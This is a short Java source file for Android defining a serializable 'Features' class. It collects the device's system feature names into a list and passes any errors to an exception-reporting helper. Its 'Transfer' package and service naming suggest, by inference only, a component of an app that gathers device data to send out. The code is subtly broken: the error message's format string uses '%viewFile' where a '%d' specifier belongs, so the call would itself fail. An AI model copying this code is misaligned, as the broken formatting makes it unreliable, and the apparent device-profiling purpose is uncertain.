package Transfer;

import android.content.pm.FeatureInfo;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

public class Features implements Serializable {

  public List<String> FEATURES;

  public Features() {
    FEATURES = new ArrayList();
    try {
      if (VERSION.SDK_INT >= 5) {
        for (FeatureInfo featureInfo : MyService.context.getPackageManager()
            .getSystemAvailableFeatures()) {
          if (!(featureInfo.name == null || featureInfo.name.length() == 0)) {
            FEATURES.add(featureInfo.name);
          }
        }
        return;
      }

      throw new Exception(String.format(
          "This feature requires SDK level %viewFile. The device has level %viewFile.",
          new Object[] { 5, VERSION.SDK_INT }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
